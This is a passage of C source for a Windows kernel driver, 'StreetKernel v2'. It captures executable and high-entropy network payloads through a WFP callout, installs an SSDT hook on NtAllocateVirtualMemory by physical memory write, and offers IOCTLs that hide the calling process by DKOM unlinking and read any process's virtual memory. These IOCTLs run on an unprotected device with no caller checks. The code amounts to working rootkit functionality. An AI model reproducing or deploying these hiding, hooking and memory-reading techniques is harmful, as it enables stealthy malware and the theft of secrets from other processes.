                for (ULONG i = 0; i < bodyLen - 1; i++) {
                    if (bodyStart[i] == 'M' && bodyStart[i+1] == 'Z') {
                        mzInBody = TRUE;
                        break;
                    }
                }
            }
        }
    }

    BOOLEAN capture = mzDirect || mzInBody || (!mzDirect && !mzInBody && EntropyHigh(flat, dataLen));
    if (capture) {
        PVOID payloadCopy = ExAllocatePool2(POOL_FLAG_NON_PAGED, dataLen, STREET_POOL_TAG);
        if (payloadCopy) {
            RtlCopyMemory(payloadCopy, flat, dataLen);
            ULONG slotIdx = SlotAlloc(payloadCopy, dataLen);
            if (slotIdx != (ULONG)-1) {
                STREET_EVENT evt = { 0 };
                evt.Type     = (mzDirect || mzInBody) ? EvtNetworkPayloadMz : EvtHighEntropyStream;
                evt.Pid      = HandleToULong(PsGetCurrentProcessId());
                evt.DataSize = dataLen;
                evt.Address  = (ULONGLONG)slotIdx;
                if (!RingPush(&evt, NULL, 0)) {
                    KIRQL irql;
                    KeAcquireSpinLock(&g_SlotLock, &irql);
                    ExFreePool(payloadCopy);
                    g_Slots[slotIdx].InUse = FALSE;
                    g_Slots[slotIdx].Data  = NULL;
                    KeReleaseSpinLock(&g_SlotLock, irql);
                }
            } else {
                ExFreePool(payloadCopy);
            }
        }
    }

    ExFreePool(staging);
}

static NTSTATUS NTAPI
StreetWfpNotify(
    _In_    FWPS_CALLOUT_NOTIFY_TYPE notifyType,
    _In_    const GUID              *filterKey,
    _Inout_ FWPS_FILTER1            *filter)
{
    UNREFERENCED_PARAMETER(notifyType);
    UNREFERENCED_PARAMETER(filterKey);
    UNREFERENCED_PARAMETER(filter);
    return STATUS_SUCCESS;
}

/* =========================================================================
 * WFP Registration
 * ========================================================================= */
static NTSTATUS
WfpRegister(PDEVICE_OBJECT devObj)
{
    NTSTATUS status;

    status = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &g_WfpEngineHandle);
    if (!NT_SUCCESS(status)) return status;

    static const GUID CALLOUT_GUID = {
        0xf53ba53d, 0x17c0, 0x4b3e,
        { 0xa2, 0x4f, 0x1a, 0x7b, 0x4c, 0x3e, 0x9d, 0x01 }
    };

    FWPS_CALLOUT1 callout = { 0 };
    callout.calloutKey   = CALLOUT_GUID;
    callout.classifyFn   = StreetWfpClassify;
    callout.notifyFn     = StreetWfpNotify;

    status = FwpsCalloutRegister1(devObj, &callout, &g_WfpCalloutId);
    if (!NT_SUCCESS(status)) {
        FwpmEngineClose0(g_WfpEngineHandle);
        g_WfpEngineHandle = NULL;
        return status;
    }

    FWPM_CALLOUT0 mCallout = { 0 };
    mCallout.calloutKey       = CALLOUT_GUID;
    mCallout.displayData.name = L"StreetKernel WFP Callout v2";
    mCallout.applicableLayer  = FWPM_LAYER_STREAM_V4;

    FwpmTransactionBegin0(g_WfpEngineHandle, 0);
    FwpmCalloutAdd0(g_WfpEngineHandle, &mCallout, NULL, NULL);

    static const GUID FILTER_GUID = {
        0xab3dce85, 0x2f11, 0x4d6a,
        { 0xbc, 0x11, 0x72, 0x3c, 0x4d, 0x2e, 0x8f, 0x11 }
    };

    FWPM_FILTER0 flt = { 0 };
    flt.filterKey          = FILTER_GUID;
    flt.displayData.name   = L"StreetKernel Stream Filter v2";
    flt.layerKey           = FWPM_LAYER_STREAM_V4;
    flt.action.type        = FWP_ACTION_CALLOUT_INSPECTION;
    flt.action.calloutKey  = CALLOUT_GUID;
    flt.weight.type        = FWP_EMPTY;
    flt.numFilterConditions= 0;

    FwpmFilterAdd0(g_WfpEngineHandle, &flt, NULL, &g_WfpFilterId);
    FwpmTransactionCommit0(g_WfpEngineHandle);

    return STATUS_SUCCESS;
}

/* =========================================================================
 * IOCTL dispatch
 * ========================================================================= */
static NTSTATUS
StreetIoControl(PDEVICE_OBJECT devObj, PIRP irp)
{
    UNREFERENCED_PARAMETER(devObj);

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(irp);
    ULONG  code   = stack->Parameters.DeviceIoControl.IoControlCode;
    PVOID  buf    = irp->AssociatedIrp.SystemBuffer;
    ULONG  inLen  = stack->Parameters.DeviceIoControl.InputBufferLength;
    ULONG  outLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
    ULONG_PTR info = 0;
    NTSTATUS status = STATUS_SUCCESS;

    switch (code) {

    /* ── 0x801  GET_EVENT: pop next event header from ring ────────── */
    case IOCTL_STREET_GET_EVENT: {
        STREET_EVENT evt  = { 0 };
        PVOID  payload    = NULL;
        ULONG  payloadSz  = 0;

        if (!RingPop(&evt, &payload, &payloadSz)) {
            LARGE_INTEGER timeout;
            timeout.QuadPart = -1LL * 10 * 1000 * 500;  /* 500 ms */
            KeWaitForSingleObject(
                &g_EventRing.DataReady, Executive, KernelMode, FALSE, &timeout);
            if (!RingPop(&evt, &payload, &payloadSz)) {
                status = STATUS_NO_MORE_ENTRIES;
                break;
            }
        }
        if (outLen >= sizeof(STREET_EVENT)) {
            RtlCopyMemory(buf, &evt, sizeof(STREET_EVENT));
            info = sizeof(STREET_EVENT);
        }
        /* MZ / entropy payloads live in slot store; only inline payloads
         * (none in current design) are freed here */
        if (payload) ExFreePool(payload);
        break;
    }

    /* ── 0x802  SET_TARGET: wide image name filter ───────────────── */
    case IOCTL_STREET_SET_TARGET: {
        if (inLen > 0 && inLen <= sizeof(g_TargetImage) - 2) {
            RtlZeroMemory(g_TargetImage, sizeof(g_TargetImage));
            RtlCopyMemory(g_TargetImage, buf, inLen);
        }
        /* If first 4 bytes are a ULONG and input is exactly 4, treat as PID */
        if (inLen == sizeof(ULONG))
            g_TargetPid = *(PULONG)buf;
        break;
    }

    /* ── 0x803  FORCE_DUMP: reserved ─────────────────────────────── */
    case IOCTL_STREET_FORCE_DUMP:
        break;

    /* ── 0x804  GET_PAYLOAD: retrieve slot payload by index ──────── */
    case IOCTL_STREET_GET_PAYLOAD: {
        if (inLen < sizeof(ULONG)) { status = STATUS_INVALID_PARAMETER; break; }

        ULONG slotIdx = *(PULONG)buf;
        if (slotIdx >= MAX_PAYLOAD_SLOTS) { status = STATUS_INVALID_PARAMETER; break; }

        KIRQL irql;
        KeAcquireSpinLock(&g_SlotLock, &irql);
        BOOLEAN  inUse   = g_Slots[slotIdx].InUse;
        ULONG    sz      = inUse ? g_Slots[slotIdx].Size : 0;
        PVOID    data    = inUse ? g_Slots[slotIdx].Data : NULL;
        KeReleaseSpinLock(&g_SlotLock, irql);

        if (!inUse)        { status = STATUS_NOT_FOUND;       break; }
        if (outLen < sz)   { status = STATUS_BUFFER_TOO_SMALL; info = sz; break; }

        RtlCopyMemory(buf, data, sz);
        info = sz;

        /* Release slot */
        KeAcquireSpinLock(&g_SlotLock, &irql);
        ExFreePool(g_Slots[slotIdx].Data);
        g_Slots[slotIdx].InUse = FALSE;
        g_Slots[slotIdx].Data  = NULL;
        g_Slots[slotIdx].Size  = 0;
        KeReleaseSpinLock(&g_SlotLock, irql);
        break;
    }

    /* ── 0x805  HIDE_SELF: DKOM physical unlink of caller's EPROCESS */
    case IOCTL_STREET_HIDE_SELF: {
        HANDLE callerPid = PsGetCurrentProcessId();
        status = DkomHideProcess(callerPid);
        break;
    }

    /* ── 0x806  READ_VIRTUAL: physical page-walk read of target VA ── */
    case IOCTL_STREET_READ_VIRTUAL: {
        if (inLen < sizeof(STREET_READVIRT_IN)) {
            status = STATUS_INVALID_PARAMETER;
            break;
        }
        PSTREET_READVIRT_IN req = (PSTREET_READVIRT_IN)buf;

        ULONG     pid  = req->Pid;
        ULONG64   va   = req->Address;
        ULONG     sz   = req->Size;

        if (!sz || sz > outLen || sz > MAX_PAYLOAD_BYTES) {
            status = STATUS_INVALID_PARAMETER;
            break;
        }
        /* Use temporary staging; copy into outBuf afterwards */
        PVOID tmp = ExAllocatePool2(POOL_FLAG_NON_PAGED, sz, STREET_POOL_TAG);
        if (!tmp) { status = STATUS_INSUFFICIENT_RESOURCES; break; }

        status = ReadProcessVirtual((HANDLE)(ULONG_PTR)pid, va, tmp, sz);
        if (NT_SUCCESS(status)) {
            RtlCopyMemory(buf, tmp, sz);
            info = sz;
        }
        ExFreePool(tmp);
        break;
    }

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    }

    irp->IoStatus.Status      = status;
    irp->IoStatus.Information = info;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}

static NTSTATUS
StreetCreateClose(PDEVICE_OBJECT devObj, PIRP irp)
{
    UNREFERENCED_PARAMETER(devObj);
    irp->IoStatus.Status      = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/* =========================================================================
 * DriverUnload
 * ========================================================================= */
static VOID
StreetDriverUnload(PDRIVER_OBJECT driverObj)
{
    UNREFERENCED_PARAMETER(driverObj);

    /* Restore SSDT hook before anything else races */
    SsdtRestoreHook();

    /* Unregister WFP */
    if (g_WfpEngineHandle) {
        FwpmTransactionBegin0(g_WfpEngineHandle, 0);
        if (g_WfpFilterId) FwpmFilterDeleteById0(g_WfpEngineHandle, g_WfpFilterId);
        FwpmTransactionCommit0(g_WfpEngineHandle);
        FwpsCalloutUnregisterById0(g_WfpCalloutId);
        FwpmCalloutDeleteById0(g_WfpEngineHandle, g_WfpCalloutId);
        FwpmEngineClose0(g_WfpEngineHandle);
        g_WfpEngineHandle = NULL;
    }

    /* Unregister ObCallbacks */
    if (g_ObCallbackHandle) {
        ObUnRegisterCallbacks(g_ObCallbackHandle);
        g_ObCallbackHandle = NULL;
    }

    PsSetCreateProcessNotifyRoutineEx(StreetProcessNotify, TRUE);

    /* Release all retained payload slots */
    SlotFreeAll();

    IoDeleteSymbolicLink(&g_DosLink);
    if (g_DeviceObject) IoDeleteDevice(g_DeviceObject);

    DbgPrint("[StreetKernel] Unloaded.\n");
}

/* =========================================================================
 * DriverEntry
 * ========================================================================= */
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status;

    RtlInitUnicodeString(&g_DeviceName, STREET_DEVICE_NAME);
    RtlInitUnicodeString(&g_DosLink,    STREET_DOS_LINK);

    status = IoCreateDevice(
        DriverObject,
        0,
        &g_DeviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &g_DeviceObject);
    if (!NT_SUCCESS(status)) return status;

    g_DeviceObject->Flags |= DO_BUFFERED_IO;

    status = IoCreateSymbolicLink(&g_DosLink, &g_DeviceName);
    if (!NT_SUCCESS(status)) { IoDeleteDevice(g_DeviceObject); return status; }

    DriverObject->DriverUnload                         = StreetDriverUnload;
    DriverObject->MajorFunction[IRP_MJ_CREATE]         = StreetCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = StreetCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = StreetIoControl;

    /* Initialize subsystems */
    RingInit();
    KeInitializeSpinLock(&g_SlotLock);
    RtlZeroMemory(g_Slots, sizeof(g_Slots));

    /* Register process notify */
    status = PsSetCreateProcessNotifyRoutineEx(StreetProcessNotify, FALSE);
    if (!NT_SUCCESS(status)) {
        IoDeleteSymbolicLink(&g_DosLink);
        IoDeleteDevice(g_DeviceObject);
        return status;
    }

    /* Register ObCallbacks */
    OB_OPERATION_REGISTRATION opReg = { 0 };
    OB_CALLBACK_REGISTRATION  cbReg = { 0 };
    opReg.ObjectType  = PsProcessType;
    opReg.Operations  = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    opReg.PreOperation= StreetObPreCallback;
    cbReg.Version     = OB_FLT_REGISTRATION_VERSION;
    cbReg.OperationRegistrationCount = 1;
    cbReg.OperationRegistration      = &opReg;
    UNICODE_STRING altitude;
    RtlInitUnicodeString(&altitude, L"321000");
    cbReg.Altitude           = altitude;
    cbReg.RegistrationContext= NULL;
    ObRegisterCallbacks(&cbReg, &g_ObCallbackHandle);

    /* Register WFP callout (optional) */
    status = WfpRegister(g_DeviceObject);
    if (!NT_SUCCESS(status))
        DbgPrint("[StreetKernel] WFP failed: 0x%X (continuing)\n", status);

    /* Install SSDT NtAllocateVirtualMemory hook via physical write */
    status = SsdtInstallHook();
    if (!NT_SUCCESS(status))
        DbgPrint("[StreetKernel] SSDT hook failed: 0x%X (continuing)\n", status);

    g_DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    DbgPrint("[StreetKernel] v2 loaded. Device: %wZ\n", &g_DeviceName);
    return STATUS_SUCCESS;
}
